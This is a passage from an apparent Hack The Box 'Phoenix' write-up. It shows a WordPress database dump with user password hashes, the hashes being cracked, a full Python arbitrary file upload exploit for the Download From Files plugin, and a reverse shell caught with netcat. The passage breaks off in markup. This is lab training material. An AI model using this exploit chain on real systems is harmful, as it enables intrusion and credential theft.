<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">Database: wordpress</span><br><span class="line">[40 tables]</span><br><span class="line">+-------------------------------------+</span><br><span class="line">| wp_commentmeta                      |</span><br><span class="line">| wp_comments                         |</span><br><span class="line">| wp_forum_ads                        |</span><br><span class="line">| wp_forum_forums                     |</span><br><span class="line">| wp_forum_polls                      |</span><br><span class="line">| wp_forum_polls_options              |</span><br><span class="line">| wp_forum_polls_votes                |</span><br><span class="line">| wp_forum_posts                      |</span><br><span class="line">| wp_forum_reactions                  |</span><br><span class="line">| wp_forum_reports                    |</span><br><span class="line">| wp_forum_topics                     |</span><br><span class="line">| wp_links                            |</span><br><span class="line">| wp_mo2f_network_blocked_ips         |</span><br><span class="line">| wp_mo2f_network_email_sent_audit    |</span><br><span class="line">| wp_mo2f_network_transactions        |</span><br><span class="line">| wp_mo2f_network_whitelisted_ips     |</span><br><span class="line">| wp_mo2f_user_details                |</span><br><span class="line">| wp_mo2f_user_login_info             |</span><br><span class="line">| wp_options                          |</span><br><span class="line">| wp_pieregister_code                 |</span><br><span class="line">| wp_pieregister_custom_user_roles    |</span><br><span class="line">| wp_pieregister_invite_code_emails   |</span><br><span class="line">| wp_pieregister_lockdowns            |</span><br><span class="line">| wp_pieregister_redirect_settings    |</span><br><span class="line">| wp_postmeta                         |</span><br><span class="line">| wp_posts                            |</span><br><span class="line">| wp_term_relationships               |</span><br><span class="line">| wp_term_taxonomy                    |</span><br><span class="line">| wp_termmeta                         |</span><br><span class="line">| wp_terms                            |</span><br><span class="line">| wp_usermeta                         |</span><br><span class="line">| wp_users                            |</span><br><span class="line">| wp_wpns_attack_logs                 |</span><br><span class="line">| wp_wpns_backup_report               |</span><br><span class="line">| wp_wpns_files_scan                  |</span><br><span class="line">| wp_wpns_ip_rate_details             |</span><br><span class="line">| wp_wpns_malware_hash_file           |</span><br><span class="line">| wp_wpns_malware_scan_report         |</span><br><span class="line">| wp_wpns_malware_scan_report_details |</span><br><span class="line">| wp_wpns_malware_skip_files          |</span><br><span class="line">+-------------------------------------+</span><br></pre></td></tr></table></figure>

<p>The immediately useful ones are wp_user that we can dump:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">+----+------------+------------------------------------+---------------+------------------------+---------------------+---------------------+-----------------------------------------------+-------------+--------------+</span><br><span class="line">| ID | user_login | user_pass                          | user_nicename | user_email             | user_url            | user_registered     | user_activation_key                           | user_status | display_name |</span><br><span class="line">+----+------------+------------------------------------+---------------+------------------------+---------------------+---------------------+-----------------------------------------------+-------------+--------------+</span><br><span class="line">|  1 | Phoenix    | $P<span class="variable">$BA5zlC0IhOiJKMTK</span>.nWBgUB4Lxh/gc. | phoenix       | phoenix@phoenix.htb    | https://phoenix.htb | 2021-11-10 15:04:57 |                                               |           0 | Phoenix      |</span><br><span class="line">|  3 | john       | $P<span class="variable">$B8eBH6QfVODeb</span>/gYCSJRvm9MyRv7xz. | john          | john@domain.htb        |                     | 2021-11-12 13:18:52 | 1637475452:$P<span class="variable">$Byf8G</span>.iNgy4e7VvrqKEAA7G/eQ9KtZ. |           0 | john         |</span><br><span class="line">|  5 | Jsmith     | $P<span class="variable">$BV5kUPHrZfVDDWSkvbt</span>/Fw3Oeozb.G. | jsmith        | john.smith@phoenix.htb |                     | 2021-11-21 06:09:43 |                                               |           0 | John Smith   |</span><br><span class="line">|  6 | Jane       | $P<span class="variable">$BJCq26vxPmaQtAthFcnyNv1322qxD91</span> | jane          | jane@phoenix.htb       |                     | 2021-11-21 06:10:43 | 1637475043:$P<span class="variable">$BMJkE2fGOJndBWkaqjsnK1OYpNn2aA</span>. |           0 | Jane Logan   |</span><br><span class="line">|  7 | Jack       | $P<span class="variable">$BzalVhBkVN</span>.6ii8y/nbv3CTLbC0E9e. | jack          | jack@phoenix.htb       |                     | 2021-11-21 06:11:27 | 1637475087:$P<span class="variable">$B3xIrY8QcD0jSicmD4B</span>/iOltw1jplE/ |           0 | Jack Thomson |</span><br><span class="line">+----+------------+------------------------------------+---------------+------------------------+---------------------+---------------------+-----------------------------------------------+-------------+--------------+</span><br></pre></td></tr></table></figure>

<p>This didn’t get me as far as I’d like. We can crack pheonix’s password to phoenixthefirebird14 using john and rockyou.txt. We can try the file upload exploit:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/hackthebox/machine/phoenix]</span><br><span class="line">└─<span class="comment"># john hash --wordlist=/usr/share/wordlists/rockyou.txt                                                        </span></span><br><span class="line">Using default input encoding: UTF-8</span><br><span class="line">Loaded 5 password hashes with 5 different salts (phpass [phpass ($P$ or $H$) 512/512 AVX512BW 16x3])</span><br><span class="line">Cost 1 (iteration count) is 8192 <span class="keyword">for</span> all loaded hashes</span><br><span class="line">Will run 4 OpenMP threads</span><br><span class="line">Press <span class="string">&#x27;q&#x27;</span> or Ctrl-C to abort, almost any other key <span class="keyword">for</span> status</span><br><span class="line">0g 0:00:00:08 1.04% (ETA: 11:01:01) 0g/s 21956p/s 109782c/s 109782C/s 840924..211126</span><br><span class="line">phoenixthefirebird14 (?)     </span><br><span class="line">superphoenix     (?)     </span><br><span class="line">password@1234    (?)     </span><br><span class="line">3g 0:00:06:25 DONE (2022-03-23 10:54) 0.007786g/s 37224p/s 99497c/s 99497C/s !!!@@@!!!..*7¡Vamos!</span><br><span class="line">Use the <span class="string">&quot;--show --format=phpass&quot;</span> options to display all of the cracked passwords reliably</span><br><span class="line">Session completed.</span><br></pre></td></tr></table></figure>

<ul>
<li><span class="exturl" data-url="aHR0cHM6Ly93d3cuZXhwbG9pdC1kYi5jb20vcmF3LzUwMjg3">Exploit Title: Wordpress Plugin Download From Files 1.48 - Arbitrary File Upload<i class="fa fa-external-link-alt"></i></span></li>
</ul>
<p>This is pretty easy to use however we run into an SSL cert issue:</p>
<p>We need to change up the request to ignore SSL verification (on both requests):</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Exploit Title: Wordpress Plugin Download From Files 1.48 - Arbitrary File Upload</span></span><br><span class="line"><span class="comment"># Google Dork: inurl:/wp-content/plugins/download-from-files</span></span><br><span class="line"><span class="comment"># Date: 10/09/2021</span></span><br><span class="line"><span class="comment"># Exploit Author: spacehen</span></span><br><span class="line"><span class="comment"># Vendor Homepage: https://wordpress.org/plugins/download-from-files/</span></span><br><span class="line"><span class="comment"># Version: &lt;= 1.48</span></span><br><span class="line"><span class="comment"># Tested on: Ubuntu 20.04.1 LTS (x86)</span></span><br><span class="line"></span><br><span class="line">import os.path</span><br><span class="line">from os import path</span><br><span class="line">import json</span><br><span class="line">import requests</span><br><span class="line">import sys</span><br><span class="line"></span><br><span class="line">def print_banner():</span><br><span class="line">	<span class="built_in">print</span>(<span class="string">&quot;Download From Files &lt;= 1.48 - Arbitrary File Upload&quot;</span>)</span><br><span class="line">	<span class="built_in">print</span>(<span class="string">&quot;Author -&gt; spacehen (www.github.com/spacehen)&quot;</span>)</span><br><span class="line"></span><br><span class="line">def print_usage():</span><br><span class="line">	<span class="built_in">print</span>(<span class="string">&quot;Usage: python3 exploit.py [target url] [php file]&quot;</span>)</span><br><span class="line">	<span class="built_in">print</span>(<span class="string">&quot;Ex: python3 exploit.py https://example.com ./shell.(php4/phtml)&quot;</span>)</span><br><span class="line"></span><br><span class="line">def vuln_check(uri):</span><br><span class="line">	response = requests.get(uri, verify=False)</span><br><span class="line">	raw = response.text</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (<span class="string">&quot;Sikeres&quot;</span> <span class="keyword">in</span> raw):</span><br><span class="line">		<span class="built_in">return</span> True;</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		<span class="built_in">return</span> False;</span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line"></span><br><span class="line">	print_banner()</span><br><span class="line">	<span class="keyword">if</span>(len(sys.argv) != 3):</span><br><span class="line">		print_usage();</span><br><span class="line">		sys.exit(1);</span><br><span class="line"></span><br><span class="line">	base = sys.argv[1]</span><br><span class="line">	file_path = sys.argv[2]</span><br><span class="line"></span><br><span class="line">	ajax_action = <span class="string">&#x27;download_from_files_617_fileupload&#x27;</span></span><br><span class="line">	admin = <span class="string">&#x27;/wp-admin/admin-ajax.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line">	uri = base + admin + <span class="string">&#x27;?action=&#x27;</span> + ajax_action ;</span><br><span class="line">	check = vuln_check(uri);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>(check == False):</span><br><span class="line">		<span class="built_in">print</span>(<span class="string">&quot;(*) Target not vulnerable!&quot;</span>);</span><br><span class="line">		sys.exit(1)</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>( path.isfile(file_path) == False):</span><br><span class="line">		<span class="built_in">print</span>(<span class="string">&quot;(*) Invalid file!&quot;</span>)</span><br><span class="line">		sys.exit(1)</span><br><span class="line"></span><br><span class="line">	files = &#123;<span class="string">&#x27;files[]&#x27;</span> : open(file_path)&#125;</span><br><span class="line">	data = &#123;</span><br><span class="line">	<span class="string">&quot;allowExt&quot;</span> : <span class="string">&quot;php4,phtml&quot;</span>,</span><br><span class="line">	<span class="string">&quot;filesName&quot;</span> : <span class="string">&quot;files&quot;</span>,</span><br><span class="line">    <span class="string">&quot;maxSize&quot;</span> : <span class="string">&quot;1000&quot;</span>,</span><br><span class="line">    <span class="string">&quot;uploadDir&quot;</span> : <span class="string">&quot;.&quot;</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">print</span>(<span class="string">&quot;Uploading Shell...&quot;</span>);</span><br><span class="line">	response = requests.post(uri, files=files, data=data, verify=False)</span><br><span class="line">	file_name = path.basename(file_path)</span><br><span class="line">	<span class="keyword">if</span>(<span class="string">&quot;ok&quot;</span> <span class="keyword">in</span> response.text):</span><br><span class="line">		<span class="built_in">print</span>(<span class="string">&quot;Shell Uploaded!&quot;</span>)</span><br><span class="line">		<span class="keyword">if</span>(base[-1] != <span class="string">&#x27;/&#x27;</span>):</span><br><span class="line">			base += <span class="string">&#x27;/&#x27;</span></span><br><span class="line">		<span class="built_in">print</span>(base + <span class="string">&quot;wp-admin/&quot;</span> + file_name);</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		<span class="built_in">print</span>(<span class="string">&quot;Shell Upload Failed&quot;</span>)</span><br><span class="line">		sys.exit(1)</span><br><span class="line"></span><br><span class="line">main()</span><br></pre></td></tr></table></figure>

<p>We can retry using a php reverse shell, Make sure this is saved with a .phtml exploit:</p>
<ul>
<li><span class="exturl" data-url="aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3BlbnRlc3Rtb25rZXkvcGhwLXJldmVyc2Utc2hlbGwvbWFzdGVyL3BocC1yZXZlcnNlLXNoZWxsLnBocA==">php-reverse-shell.php<i class="fa fa-external-link-alt"></i></span></li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/hackthebox/machine/phoenix]</span><br><span class="line">└─<span class="comment"># python3 exploit.py https://phoenix.htb/ ./shell.phtml</span></span><br><span class="line">Download From Files &lt;= 1.48 - Arbitrary File Upload</span><br><span class="line">Author -&gt; spacehen (www.github.com/spacehen)</span><br><span class="line">/usr/local/lib/python3.9/dist-packages/urllib3/connectionpool.py:1013: InsecureRequestWarning: Unverified HTTPS request is being made to host <span class="string">&#x27;phoenix.htb&#x27;</span>. Adding certificate verification is strongly advised. See: https://urllib3.readthedocs.io/en/latest/advanced-usage.html<span class="comment">#ssl-warnings</span></span><br><span class="line">  warnings.warn(</span><br><span class="line">Uploading Shell...</span><br><span class="line">/usr/local/lib/python3.9/dist-packages/urllib3/connectionpool.py:1013: InsecureRequestWarning: Unverified HTTPS request is being made to host <span class="string">&#x27;phoenix.htb&#x27;</span>. Adding certificate verification is strongly advised. See: https://urllib3.readthedocs.io/en/latest/advanced-usage.html<span class="comment">#ssl-warnings</span></span><br><span class="line">  warnings.warn(</span><br><span class="line">Shell Uploaded!</span><br><span class="line">https://phoenix.htb/wp-admin/shell.phtml</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/hackthebox/machine/phoenix]</span><br><span class="line">└─<span class="comment"># nc -lvp 1234</span></span><br><span class="line">Ncat: Version 7.92 ( https://nmap.org/ncat )</span><br><span class="line">Ncat: Listening on :::1234</span><br><span class="line">Ncat: Listening on 0.0.0.0:1234</span><br><span class="line">Ncat: Connection from 10.10.11.149.</span><br><span class="line">Ncat: Connection from 10.10.11.149:34844.</span><br><span class="line">Linux phoenix 5.4.0-96-generic <span class="comment">#109-Ubuntu SMP Wed Jan 12 16:49:16 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux</span></span><br><span class="line"> 06:28:24 up 18:25,  0 <span class="built_in">users</span>,  load average: 0.00, 0.00, 0.00</span><br><span class="line">USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT</span><br><span class="line">uid=1001(wp_user) gid=1001(wp_user) <span class="built_in">groups</span>=1001(wp_user)</span><br><span class="line">/bin/sh: 0: can<span class="string">&#x27;t access tty; job control turned off</span></span><br><span class="line"><span class="string">$ python3 -c &#x27;</span>import pty; pty.spawn(<span class="string">&quot;/bin/bash&quot;</span>)<span class="string">&#x27;</span></span><br><span class="line"><span class="string">wp_user@phoenix:/$ ^Z</span></span><br><span class="line"><span class="string">[1]+  Stopped                 nc -lvp 1234</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">┌──(root💀kali)-[~/hackthebox/machine/phoenix]</span></span><br><span class="line"><span class="string">└─# stty raw -echo</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">┌──(root💀kali)-[~/hackthebox/machine/phoenix]</span></span><br><span class="line"><span class="string">nc -lvp 1234</span></span><br><span class="line"><span class="string">            reset</span></span><br><span class="line"><span class="string">reset: unknown terminal type unknown</span></span><br><span class="line"><span class="string">Terminal type? screen</span></span><br><span class="line"><span class="string">wp_user@phoenix:/$ id</span></span><br><span class="line"><span class="string">uid=1001(wp_user) gid=1001(wp_user) groups=1001(wp_user)</span></span><br><span class="line"><span class="string">wp_user@phoenix:/$ whoami</span></span><br><span class="line"><span class="string">wp_user</span></span><br></pre></td></tr></table></figure>

<h1 id="GET-OPT-KEY"><a href="#GET-OPT-KEY" class="headerlink" title="GET OPT KEY"></a>GET OPT KEY</h1><p>we find there is a 2FA auth in &#x2F;wp-admin login page, we try to figure it out how to bypass it, or just get the OTP key:</p>
<p>and we found encrypt and decrypt functions from the source of that miniorange plugin at handler&#x2F;twofa&#x2F;two_fa_utility.php</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span 